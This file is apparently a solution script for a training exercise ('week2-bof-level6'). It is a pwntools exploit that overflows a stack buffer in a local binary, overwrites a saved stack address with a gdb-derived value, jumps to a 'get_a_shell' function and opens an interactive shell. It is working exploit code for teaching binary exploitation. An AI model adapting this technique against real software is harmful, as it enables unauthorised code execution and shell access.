  # week2-bof-level6
  #!/usr/bin/env python                                                            
                                                                                    
  from pwn import *                                                                
                                                                                    
  # create process and run the program                                             
  #buf = "A" * 0x84                                                   
                                                                              
  #c = Core('./core')
  #buffer_addr = c.stack.find(buf)                                                  
  #print(hex(buffer_addr))                                                          
  #quit()                                                               
                                                                                    
  e = ELF('./bof-level6')                                                          
  get_a_shell = e.symbols['get_a_shell']                                           
  print(hex(get_a_shell))                                                                                                                                                                                                                                                   #we assume buffer start from 0x7fffffffe2b0, then use gdb to find it                                                                 
  buffer_addr = p64(0x7fffffffe280)                                                
  buf = "AAAAAAAA" + p64(get_a_shell) + "A" * (0x80 - 16) + buffer_addr                
  
  p = process("./bof-level6") 

  p.sendline(buf)                                                                  
                                                                                   
  p.interactive() 